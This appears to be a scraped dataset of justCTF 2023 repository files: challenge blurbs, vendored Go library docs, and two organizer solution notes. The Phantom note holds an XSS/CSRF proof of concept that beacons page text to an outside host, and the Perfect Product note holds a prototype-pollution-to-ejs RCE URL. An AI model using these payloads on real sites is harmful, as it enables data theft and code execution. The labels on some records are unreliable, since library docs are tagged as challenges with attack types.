{"id": "justcatthefish_justctf-2023_Rustberry", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Rustberry", "attack_type": "Unknown", "writeup": "### Rustberry\nI have enough of VMs. This is a simple crackme\n\nNote: flag is in format jctf{[A-Za-z0-9_]+}\n\nAuthor: Plukasik\n\n\nAttachments:\n* [rustberry.exe](./public/rustberry.exe)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_rustberry\\README.md", "file_size": 180, "scraped_at": "2025-10-26T18:20:50.911159"}
{"id": "justcatthefish_justctf-2023_thiefcat", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "thiefcat", "attack_type": "Reverse", "writeup": "### thiefcat\nMy friend told me they made a terminal based game, but using some issue with stock netcat as an excuse they sent me this netcat-like binary telling me to use it instead! I didn't get the source code, but I took a quick look at it using a well-known state-of-the-art reverse engineering tool and it seemed perfectly safe to run. However, it stole the flag for this task from me! Can you get it back?\n\nI recorded the network traffic and reconstructed a simple server in Python from it. The program was confirmed to run in a ubuntu:20.04 container, but it should run on almost any Linux distro out there.\n\n\nAttachments:\n* [thiefcat_server.py](./public/thiefcat_server.py)\n* [thiefcat](./public/thiefcat)", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_thiefcat\\README.md", "file_size": 713, "scraped_at": "2025-10-26T18:20:50.926576"}
{"id": "justcatthefish_justctf-2023_Trial_of_Bugs", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Trial of Bugs", "attack_type": "Unknown", "writeup": "### Trial of Bugs\nI started working on a web RPG game with an insane scope but then I ran out of time!\nBug bugs can turn into features if it's a CTF! Well then...! Can you complete the Trial of Bugs?\n\nNote that this is the same game as the \"Trial of Data\" challenge.\n\n**Servers:**\n* [ams-1.rpg.jctf.pro](http://ams-1.rpg.jctf.pro)\n* [sgp-1.rpg.jctf.pro](http://sgp-1.rpg.jctf.pro)\n* [nyc-1.rpg.jctf.pro](http://nyc-1.rpg.jctf.pro)\n\nAuthor: ptrtofuture\n\n\nAttachments:\n* [rpg_client.tar.gz](./public/rpg_client.tar.gz)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_trial_of_bugs\\README.md", "file_size": 516, "scraped_at": "2025-10-26T18:20:50.943402"}
{"id": "justcatthefish_justctf-2023_Trial_of_Data", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Trial of Data", "attack_type": "Unknown", "writeup": "### Trial of Data\nCan you find the hidden secrets needed to complete the Trial of Data?\n\nPlease refer to the \"Trial of Bugs\" task for servers and files.\n\nAuthor: ptrtofuture", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_trial_of_data\\README.md", "file_size": 173, "scraped_at": "2025-10-26T18:20:50.958016"}
{"id": "justcatthefish_justctf-2023_🐠_Dive_into_Aquatic_Delights!_🌊", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "🐠 Dive into Aquatic Delights! 🌊", "attack_type": "Unknown", "writeup": "### 🐠 Dive into Aquatic Delights! 🌊\n\nCalling all aquatic enthusiasts and fish lovers! Are you ready to embark on an extraordinary underwater adventure right in the comfort of your own home? Look no further than Aquatic Delights, your one-stop destination for all your needs.\n\nAuthor: Anony\n\n* [http://aquatic-ams1.web.jctf.pro](http://aquatic-ams1.web.jctf.pro)\n* [http://aquatic-sgp1.web.jctf.pro](http://aquatic-sgp1.web.jctf.pro)\n* [http://aquatic-nyc1.web.jctf.pro](http://aquatic-nyc1.web.jctf.pro)\n\n\n\nAttachments:\n* [challenge.7z](./public/challenge.7z)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_aquatic_delights\\README.md", "file_size": 559, "scraped_at": "2025-10-26T18:20:50.971602"}
{"id": "justcatthefish_justctf-2023_Dangerous", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Dangerous", "attack_type": "Unknown", "writeup": "### Dangerous\nMy friend told me there's a secret page on this forum, but it's only for administrators.\n\n\nAttachments:\n* [dangerous_48b8563c994cab3c7f55661ef65c0159.tar](./public/dangerous_48b8563c994cab3c7f55661ef65c0159.tar)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_dangerous\\README.md", "file_size": 225, "scraped_at": "2025-10-26T18:20:50.984414"}
{"id": "justcatthefish_justctf-2023_ESSAMTP", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "ESSAMTP", "attack_type": "RSA", "writeup": "### ESSAMTP\nESSAMTP: Encrypted Simple Sender-Adversary Mail Transfer Protocol\n\nit's encrypted you know, so it should not matter that we gave you MITM capability...\n\n* http://essamtp.web.jctf.pro:5000/\n* Relay: essamtp.web.jctf.pro:8025\n\n\nAttachments:\n* [essamtp.zip](./public/essamtp.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_essamtp\\README.md", "file_size": 288, "scraped_at": "2025-10-26T18:20:50.999151"}
{"id": "justcatthefish_justctf-2023_eXtra_Safe_Security_layers", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "eXtra Safe Security layers", "attack_type": "Web", "writeup": "### eXtra Safe Security layers\nI have a new security system, it's so safe that I don't even need to hide the source code.\n\nhttp://xssl.web.jctf.pro/\n\n\nAttachments:\n* [web_extra-safe-security-layers_6837b5eff2a15f387f6488f01f311cb4.zip](./public/web_extra-safe-security-layers_6837b5eff2a15f387f6488f01f311cb4.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_extra-safe-security-layers\\README.md", "file_size": 313, "scraped_at": "2025-10-26T18:20:51.010571"}
{"id": "justcatthefish_justctf-2023_almost_finished", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "almost finished", "attack_type": "Unknown", "writeup": "### almost finished\nI heard my friends from ![dice](https://cdn.discordapp.com/emojis/671327507894632460.webp?size=96&quality=lossless) had problems with hackers. I had to harden the application and didn't have time to finish it :( I hope it's secure now.\n\n* [http://almostfinished.web.jctf.pro](http://almostfinished.web.jctf.pro)\n\n\nAttachments:\n* [almost-finished.zip](./public/almost-finished.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb\\README.md", "file_size": 400, "scraped_at": "2025-10-26T18:20:51.026682"}
{"id": "justcatthefish_justctf-2023_almost_finished2", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "almost finished2", "attack_type": "Unknown", "writeup": "### almost finished2\nI quit programming, I'm going to be a farmer.\n\n* [http://almostfinished2.web.jctf.pro](http://almostfinished2.web.jctf.pro)\n\n\nAttachments:\n* [almost-finished2.zip](./public/almost-finished2.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\README.md", "file_size": 215, "scraped_at": "2025-10-26T18:20:51.039203"}
{"id": "justcatthefish_justctf-2023_Perfect_Product", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Perfect Product", "attack_type": "Unknown", "writeup": "### Perfect Product\nCheck out my newest product gallery.\n\n\nAttachments:\n* [perfect-product.zip](./public/perfect-product.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\README.md", "file_size": 125, "scraped_at": "2025-10-26T18:20:51.053696"}
{"id": "justcatthefish_justctf-2023_Phantom", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Phantom", "attack_type": "Unknown", "writeup": "### Phantom\nI think our filters are unbypassable.\n\n* [https://phantom.web.jctf.pro](https://phantom.web.jctf.pro)\n\n\n\nAttachments:\n* [phantom.zip](./public/phantom.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_phantom\\README.md", "file_size": 167, "scraped_at": "2025-10-26T18:20:51.066947"}
{"id": "justcatthefish_justctf-2023_Description", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Description", "attack_type": "Unknown", "writeup": "I think our filters are unbypassable.\n\n* [https://phantom.web.jctf.pro](https://phantom.web.jctf.pro)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_phantom\\private\\Description.md", "file_size": 102, "scraped_at": "2025-10-26T18:20:51.080672"}
{"id": "justcatthefish_justctf-2023_Phantom", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Phantom", "attack_type": "Web", "writeup": "# Phantom\n\nSelf-XSS because of the validation with Tokenizer instead of Parser plus HEAD-based CSRF.\n\n1. XSS works when using non-HTML namespace tags like `<svg><textarea><script>alert()</script></textarea></svg>`\n2. CSRF protection can be bypassed on adding description by using HEAD method.\n\n## POC\n\n```html\n<html>\n  <body>\n    <script>\n      fetch('https://localtest.me:443/profile/edit?description=%3csvg%3e%3ctextarea%3e%3cscript%3enavigator.sendBeacon(\"https://6ryity9rcl45utozwwbc670zsqyhmda2.oastify.com\",document.documentElement.innerText)%3c%2fscript%3e%3c%2ftextarea%3e%3c%2fsvg%3e', {\n            method: 'HEAD',\n            credentials: 'include',\n            mode: 'cors'\n        }).then(response => {\n            // Handle response\n            console.log(response);\n        }).catch(error => {\n            // Handle error\n            window.open('https://localtest.me:443/profile')\n        });\n    </script>\n  </body>\n</html>\n\n```", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_phantom\\private\\README.md", "file_size": 946, "scraped_at": "2025-10-26T18:20:51.171858"}
{"id": "justcatthefish_justctf-2023_Perfect_Product", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Perfect Product", "attack_type": "Web", "writeup": "## Perfect Product\n\n1. The app uses old Express version which depends on `qs` vulnerable to [Prototype Poisoning](https://security.snyk.io/vuln/SNYK-JS-QS-3153490)\n2. Thanks to that, with just a query it's possible to pass an object that is also an array: `?q[__proto__][]=1&q[abc]=asd`\n3. The app splits the array to placeholders `_0`, `_1`, ... and then passes that to `render('product', data)`\n4. An attacker can pollute data with arbitrary properties via `?q[__proto__][]=1&q[_proto__][property]=smth`, because `_proto__` will become `__proto__` and it allows for another level of local pollution.\n5. There is a 0day in [ejs](https://github.com/mde/ejs/blob/main/lib/ejs.js#L637) that allows to get RCE. (Similar to [CVE-2022-29078](https://eslam.io/posts/ejs-server-side-template-injection-rce/))\n6. `/product` is cached, so the poc needs to bypass that with: `v[_proto__][settings][view%20cache]=&v[_proto__][cache]=`\n7. Full PoC: `product?name=watch&v[__proto__][]=1&&v[1]&v[2]&v[3]&v[4]&v[5]&v[_proto__][settings][view%20options][escape]=function(){return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)};&v[_proto__][settings][view%20options][client]=1&v[_proto__][settings][view%20cache]=&v[_proto__][cache]=`\n\n\n8*. XSS is intended, it's a troll vulnerability.", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\INTERNAL.md", "file_size": 1298, "scraped_at": "2025-10-26T18:20:51.203206"}
{"id": "justcatthefish_justctf-2023_TODO", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "TODO", "attack_type": "Unknown", "writeup": "## TODO\n## Readme.md\n\n1. `./run.sh` buduje i startuje instancera\n2. `./solver/solver.sh <instancja_id>.perfectproduct.web.jctf.pro`\n3. Intended bugi: [INTERNAL.md](./INTERNAL.md)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\README.md", "file_size": 178, "scraped_at": "2025-10-26T18:20:51.221070"}
{"id": "justcatthefish_justctf-2023_Building_`sys_unix`", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Building `sys/unix`", "attack_type": "Pwn", "writeup": "# Building `sys/unix`\n\nThe sys/unix package provides access to the raw system call interface of the\nunderlying operating system. See: https://godoc.org/golang.org/x/sys/unix\n\nPorting Go to a new architecture/OS combination or adding syscalls, types, or\nconstants to an existing architecture/OS pair requires some manual effort;\nhowever, there are tools that automate much of the process.\n\n## Build Systems\n\nThere are currently two ways we generate the necessary files. We are currently\nmigrating the build system to use containers so the builds are reproducible.\nThis is being done on an OS-by-OS basis. Please update this documentation as\ncomponents of the build system change.\n\n### Old Build System (currently for `GOOS != \"linux\"`)\n\nThe old build system generates the Go files based on the C header files\npresent on your system. This means that files\nfor a given GOOS/GOARCH pair must be generated on a system with that OS and\narchitecture. This also means that the generated code can differ from system\nto system, based on differences in the header files.\n\nTo avoid this, if you are using the old build system, only generate the Go\nfiles on an installation with unmodified header files. It is also important to\nkeep track of which version of the OS the files were generated from (ex.\nDarwin 14 vs Darwin 15). This makes it easier to track the progress of changes\nand have each OS upgrade correspond to a single change.\n\nTo build the files for your current OS and architecture, make sure GOOS and\nGOARCH are set correctly and run `mkall.sh`. This will generate the files for\nyour specific system. Running `mkall.sh -n` shows the commands that will be run.\n\nRequirements: bash, go\n\n### New Build System (currently for `GOOS == \"linux\"`)\n\nThe new build system uses a Docker container to generate the go files directly\nfrom source checkouts of the kernel and various system libraries. This means\nthat on any platform that supports Docker, all the files using the new build\nsystem can be generated at once, and generated files will not change based on\nwhat the person running the scripts has installed on their computer.\n\nThe OS specific files for the new build system are located in the `${GOOS}`\ndirectory, and the build is coordinated by the `${GOOS}/mkall.go` program. When\nthe kernel or system library updates, modify the Dockerfile at\n`${GOOS}/Dockerfile` to checkout the new release of the source.\n\nTo build all the files under the new build system, you must be on an amd64/Linux\nsystem and have your GOOS and GOARCH set accordingly. Running `mkall.sh` will\nthen generate all of the files for all of the GOOS/GOARCH pairs in the new build\nsystem. Running `mkall.sh -n` shows the commands that will be run.\n\nRequirements: bash, go, docker\n\n## Component files\n\nThis section describes the various files used in the code generation process.\nIt also contains instructions on how to modify these files to add a new\narchitecture/OS or to add additional syscalls, types, or constants. Note that\nif you are using the new build system, the scripts/programs cannot be called normally.\nThey must be called from within the docker container.\n\n### asm files\n\nThe hand-written assembly file at `asm_${GOOS}_${GOARCH}.s` implements system\ncall dispatch. There are three entry points:\n```\n  func Syscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)\n  func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2, err uintptr)\n  func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)\n```\nThe first and second are the standard ones; they differ only in how many\narguments can be passed to the kernel. The third is for low-level use by the\nForkExec wrapper. Unlike the first two, it does not call into the scheduler to\nlet it know that a system call is running.\n\nWhen porting Go to a new architecture/OS, this file must be implemented for\neach GOOS/GOARCH pair.\n\n### mksysnum\n\nMksysnum is a Go program located at `${GOOS}/mksysnum.go` (or `mksysnum_${GOOS}.go`\nfor the old system). This program takes in a list of header files containing the\nsyscall number declarations and parses them to produce the corresponding list of\nGo numeric constants. See `zsysnum_${GOOS}_${GOARCH}.go` for the generated\nconstants.\n\nAdding new syscall numbers is mostly done by running the build on a sufficiently\nnew installation of the target OS (or updating the source checkouts for the\nnew build system). However, depending on the OS, you may need to update the\nparsing in mksysnum.\n\n### mksyscall.go\n\nThe `syscall.go`, `syscall_${GOOS}.go`, `syscall_${GOOS}_${GOARCH}.go` are\nhand-written Go files which implement system calls (for unix, the specific OS,\nor the specific OS/Architecture pair respectively) that need special handling\nand list `//sys` comments giving prototypes for ones that can be generated.\n\nThe mksyscall.go program takes the `//sys` and `//sysnb` comments and converts\nthem into syscalls. This requires the name of the prototype in the comment to\nmatch a syscall number in the `zsysnum_${GOOS}_${GOARCH", "solution_code": "", "tools": ["radare2"], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\golang.org\\x\\sys\\unix\\README.md", "file_size": 8685, "scraped_at": "2025-10-26T18:20:51.241950"}
{"id": "justcatthefish_justctf-2023_Change_Log", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Change Log", "attack_type": "Unknown", "writeup": "# Change Log\nAll notable changes to this project will be documented in this file.\nThis project adheres to [Semantic Versioning](http://semver.org/).\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\CHANGELOG.md", "file_size": 149, "scraped_at": "2025-10-26T18:20:51.254342"}
{"id": "justcatthefish_justctf-2023_LICENSE", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "LICENSE", "attack_type": "Unknown", "writeup": "The MIT License (MIT)\n\nCopyright (c) 2015 Usman Mahmood\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\LICENSE.md", "file_size": 1081, "scraped_at": "2025-10-26T18:20:51.268579"}
{"id": "justcatthefish_justctf-2023_Hashcash", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Hashcash", "attack_type": "Reverse", "writeup": "# Hashcash\n\nHashcash is a Go library which implements the hashcash algorithm. Hashcash is a \nproof-of-work algorithm, which has been used as a denial-of-service counter \nmeasure technique in a number of systems. To learn more about hashcash, \ngo [here](http://hashcash.org/).\n\n# Installation\n\n> go get github.com/umahmood/hashcash\n\n# Usage\n\nComputing a hashcash:\n```\npackage main\n\nimport (\n    \"fmt\"\n    \n    \"github.com/umahmood/hashcash\"\n)\n\nfunc validateResource(resource string) bool {\n    // validate resource. resource could be an email, ip \n    // address, etc... so for an email we could check it \n    // exists in the database.\n    return true\n}\n\nfunc main() {\n    hc, err := hashcash.New(\n        &hashcash.Resource{\n            Data:          \"someone@gmail.com\",\n            ValidatorFunc: validateResource,\n        },\n        nil, // use default config.\n    )\n    if err != nil {\n        // handle error\n    }\n    \n    solution, err := hc.Compute()\n    if err != nil {\n        if err != hashcash.ErrSolutionFail {\n            // did not find a solution, can call compute again.\n        }\n    } \n    fmt.Println(solution)\n}\n```\nOutput:\n```\n1:20:040806:foo::65f460d0726f420d:13a6b8\n```\n```\n$ echo -n \"1:20:040806:foo::65f460d0726f420d:13a6b8\" | shasum\n00000f91d51a9c213f9b7420c35c62b5e818c23e\n```\nVerifying a hashcash:\n```\nvalid, err := hc.Verify(solution)\nif err != nil {\n    // handle error\n}\nif !valid {\n   // hashcash token failed verification.\n}\n```\nStorage:\n\nIn order to detect double spending, hashcash stores verified hashcash tokens in \na sqlite3 database. This database is stored in ~/.hashcash/spent.db.\n\nIf you would like to change the underlying storage (i.e. to an in memory hash \ntable) or location. You will need to build a type which satisfies the *Storage* \ninterface.\n\n# To Do\n\n- Allow entries in default storage (sqlite3 database) to be purged.\n\n# Documentation\n\nhttp://godoc.org/github.com/umahmood/hashcash\n\n# License\n\nSee the [LICENSE](LICENSE.md) file for license rights and limitations (MIT).\n", "solution_code": "    solution, err := hc.Compute()\n    if err != nil {\n        if err != hashcash.ErrSolutionFail {\n            // did not find a solution, can call compute again.\n        }\n    } \n    fmt.Println(solution)\n", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\umahmood\\hashcash\\README.md", "file_size": 2028, "scraped_at": "2025-10-26T18:20:51.286875"}
{"id": "justcatthefish_justctf-2023_1.8.1", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "1.8.1", "attack_type": "Misc", "writeup": "# 1.8.1\nCode quality:\n  * move magefile in its own subdir/submodule to remove magefile dependency on logrus consumer\n  * improve timestamp format documentation\n\nFixes:\n  * fix race condition on logger hooks\n\n\n# 1.8.0\n\nCorrect versioning number replacing v1.7.1.\n\n# 1.7.1\n\nBeware this release has introduced a new public API and its semver is therefore incorrect.\n\nCode quality:\n  * use go 1.15 in travis\n  * use magefile as task runner\n\nFixes:\n  * small fixes about new go 1.13 error formatting system\n  * Fix for long time race condiction with mutating data hooks\n\nFeatures:\n  * build support for zos\n\n# 1.7.0\nFixes:\n  * the dependency toward a windows terminal library has been removed\n\nFeatures:\n  * a new buffer pool management API has been added\n  * a set of `<LogLevel>Fn()` functions have been added\n\n# 1.6.0\nFixes:\n  * end of line cleanup\n  * revert the entry concurrency bug fix whic leads to deadlock under some circumstances\n  * update dependency on go-windows-terminal-sequences to fix a crash with go 1.14\n\nFeatures:\n  * add an option to the `TextFormatter` to completely disable fields quoting\n\n# 1.5.0\nCode quality:\n  * add golangci linter run on travis\n\nFixes:\n  * add mutex for hooks concurrent access on `Entry` data\n  * caller function field for go1.14\n  * fix build issue for gopherjs target\n\nFeature:\n  * add an hooks/writer sub-package whose goal is to split output on different stream depending on the trace level\n  * add a `DisableHTMLEscape` option in the `JSONFormatter`\n  * add `ForceQuote` and `PadLevelText` options in the `TextFormatter`\n\n# 1.4.2\n  * Fixes build break for plan9, nacl, solaris\n# 1.4.1\nThis new release introduces:\n  * Enhance TextFormatter to not print caller information when they are empty (#944)\n  * Remove dependency on golang.org/x/crypto (#932, #943)\n\nFixes:\n  * Fix Entry.WithContext method to return a copy of the initial entry (#941)\n\n# 1.4.0\nThis new release introduces:\n  * Add `DeferExitHandler`, similar to `RegisterExitHandler` but prepending the handler to the list of handlers (semantically like `defer`) (#848).\n  * Add `CallerPrettyfier` to `JSONFormatter` and `TextFormatter` (#909, #911)\n  * Add `Entry.WithContext()` and `Entry.Context`, to set a context on entries to be used e.g. in hooks (#919).\n\nFixes:\n  * Fix wrong method calls `Logger.Print` and `Logger.Warningln` (#893).\n  * Update `Entry.Logf` to not do string formatting unless the log level is enabled (#903)\n  * Fix infinite recursion on unknown `Level.String()` (#907)\n  * Fix race condition in `getCaller` (#916).\n\n\n# 1.3.0\nThis new release introduces:\n  * Log, Logf, Logln functions for Logger and Entry that take a Level\n\nFixes:\n  * Building prometheus node_exporter on AIX (#840)\n  * Race condition in TextFormatter (#468)\n  * Travis CI import path (#868)\n  * Remove coloured output on Windows (#862)\n  * Pointer to func as field in JSONFormatter (#870)\n  * Properly marshal Levels (#873)\n\n# 1.2.0\nThis new release introduces:\n  * A new method `SetReportCaller` in the `Logger` to enable the file, line and calling function from which the trace has been issued\n  * A new trace level named `Trace` whose level is below `Debug`\n  * A configurable exit function to be called upon a Fatal trace\n  * The `Level` object now implements `encoding.TextUnmarshaler` interface\n\n# 1.1.1\nThis is a bug fix release.\n  * fix the build break on Solaris\n  * don't drop a whole trace in JSONFormatter when a field param is a function pointer which can not be serialized\n\n# 1.1.0\nThis new release introduces:\n  * several fixes:\n    * a fix for a race condition on entry formatting\n    * proper cleanup of previously used entries before putting them back in the pool\n    * the extra new line at the end of message in text formatter has been removed\n  * a new global public API to check if a level is activated: IsLevelEnabled\n  * the following methods have been added to the Logger object\n    * IsLevelEnabled\n    * SetFormatter\n    * SetOutput\n    * ReplaceHooks\n  * introduction of go module\n  * an indent configuration for the json formatter\n  * output colour support for windows\n  * the field sort function is now configurable for text formatter\n  * the CLICOLOR and CLICOLOR\\_FORCE environment variable support in text formater\n\n# 1.0.6\n\nThis new release introduces:\n  * a new api WithTime which allows to easily force the time of the log entry\n    which is mostly useful for logger wrapper\n  * a fix reverting the immutability of the entry given as parameter to the hooks\n    a new configuration field of the json formatter in order to put all the fields\n    in a nested dictionnary\n  * a new SetOutput method in the Logger\n  * a new configuration of the textformatter to configure the name of the default keys\n  * a new configuration of the text formatter to disable the level truncation\n\n# 1.0.5\n\n* Fix hooks race (#707)\n* Fix panic deadlock (#695)\n\n# 1.0.4\n\n* Fix race when adding hooks (#612)\n* Fix terminal check in AppEngine (#635)\n\n# 1.0.3\n\n* Replace example files with t", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_perfectproduct\\private\\private\\manager\\vendor\\github.com\\sirupsen\\logrus\\CHANGELOG.md", "file_size": 7470, "scraped_at": "2025-10-26T18:20:51.305131"}
{"id": "justcatthefish_justctf-2023_Logrus_<img_src=\"http:__i.imgur.com_hTeVwmJ.png\"_width=\"40\"_height=\"40\"_alt=\":walrus:\"_class=\"emoji\"_title=\":walrus:\"_>_[![Build_Status](https:__github.com_sirupsen_logrus_workflows_CI_badge.svg)](https:__github.com_sirupsen_logrus_actions?query=workflow%3ACI)_[![Build_Status](https:__travis-ci.org_sirupsen_logrus.svg?branch=master)](https:__travis-ci.org_sirupsen_logrus)_[![Go_Reference](https:__pkg.go.dev_badge_github.com_sirupsen_logrus.svg)](https:__pkg.go.dev_github.com_sirupsen_logrus)", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Logrus <img src=\"http://i.imgur.com/hTeVwmJ.png\" width=\"40\" height=\"40\" alt=\":walrus:\" class=\"emoji\" title=\":walrus:\"/> [![Build Status](https://github.com/sirupsen/logrus/workflows/CI/badge.svg)](https://github.com/sirupsen/logrus/actions?query=workflow%3ACI) [![Build Status](https://travis-ci.org/sirupsen/logrus.svg?branch=master)](https://travis-ci.org/sirupsen/logrus) [![Go Reference](https://pkg.go.dev/badge/github.com/sirupsen/logrus.svg)](https://pkg.go.dev/github.com/sirupsen/logrus)", "attack_type": "Reverse", "writeup": "# Logrus <img src=\"http://i.imgur.com/hTeVwmJ.png\" width=\"40\" height=\"40\" alt=\":walrus:\" class=\"emoji\" title=\":walrus:\"/> [![Build Status](https://github.com/sirupsen/logrus/workflows/CI/badge.svg)](https://github.com/sirupsen/logrus/actions?query=workflow%3ACI) [![Build Status](https://travis-ci.org/sirupsen/logrus.svg?branch=master)](https://travis-ci.org/sirupsen/logrus) [![Go Reference](https://pkg.go.dev/badge/github.com/sirupsen/logrus.svg)](https://pkg.go.dev/github.com/sirupsen/logrus)\n\nLogrus is a structured logger for Go (golang), completely API compatible with\nthe standard library logger.\n\n**Logrus is in maintenance-mode.** We will not be introducing new features. It's\nsimply too hard to do in a way that won't break many people's projects, which is\nthe last thing you want from your Logging library (again...).\n\nThis does not mean Logrus is dead. Logrus will continue to be maintained for\nsecurity, (backwards compatible) bug fixes, and performance (where we are\nlimited by the interface). \n\nI believe Logrus' biggest contribution is to have played a part in today's\nwidespread use of structured logging in Golang. There doesn't seem to be a\nreason to do a major, breaking iteration into Logrus V2, since the fantastic Go\ncommunity has built those independently. Many fantastic alternatives have sprung\nup. Logrus would look like those, had it been re-designed with what we know\nabout structured logging in Go today. Check out, for example,\n[Zerolog][zerolog], [Zap][zap], and [Apex][apex].\n\n[zerolog]: https://github.com/rs/zerolog\n[zap]: https://github.com/uber-go/zap\n[apex]: https://github.com/apex/log\n\n**Seeing weird case-sensitive problems?** It's in the past been possible to\nimport Logrus as both upper- and lower-case. Due to the Go package environment,\nthis caused issues in the community and we needed a standard. Some environments\nexperienced problems with the upper-case variant, so the lower-case was decided.\nEverything using `logrus` will need to use the lower-case:\n`github.com/sirupsen/logrus`. Any package that isn't, should be changed.\n\nTo fix Glide, see [these\ncomments](https://github.com/sirupsen/logrus/issues/553#issuecomment-306591437).\nFor an in-depth explanation of the casing issue, see [this\ncomment](https://github.com/sirupsen/logrus/issues/570#issuecomment-313933276).\n\nNicely color-coded in development (when a TTY is attached, otherwise just\nplain text):\n\n![Colored](http://i.imgur.com/PY7qMwd.png)\n\nWith `log.SetFormatter(&log.JSONFormatter{})`, for easy parsing by logstash\nor Splunk:\n\n```json\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"A group of walrus emerges from the\nocean\",\"size\":10,\"time\":\"2014-03-10 19:57:38.562264131 -0400 EDT\"}\n\n{\"level\":\"warning\",\"msg\":\"The group's number increased tremendously!\",\n\"number\":122,\"omg\":true,\"time\":\"2014-03-10 19:57:38.562471297 -0400 EDT\"}\n\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"A giant walrus appears!\",\n\"size\":10,\"time\":\"2014-03-10 19:57:38.562500591 -0400 EDT\"}\n\n{\"animal\":\"walrus\",\"level\":\"info\",\"msg\":\"Tremendously sized cow enters the ocean.\",\n\"size\":9,\"time\":\"2014-03-10 19:57:38.562527896 -0400 EDT\"}\n\n{\"level\":\"fatal\",\"msg\":\"The ice breaks!\",\"number\":100,\"omg\":true,\n\"time\":\"2014-03-10 19:57:38.562543128 -0400 EDT\"}\n```\n\nWith the default `log.SetFormatter(&log.TextFormatter{})` when a TTY is not\nattached, the output is compatible with the\n[logfmt](http://godoc.org/github.com/kr/logfmt) format:\n\n```text\ntime=\"2015-03-26T01:27:38-04:00\" level=debug msg=\"Started observing beach\" animal=walrus number=8\ntime=\"2015-03-26T01:27:38-04:00\" level=info msg=\"A group of walrus emerges from the ocean\" animal=walrus size=10\ntime=\"2015-03-26T01:27:38-04:00\" level=warning msg=\"The group's number increased tremendously!\" number=122 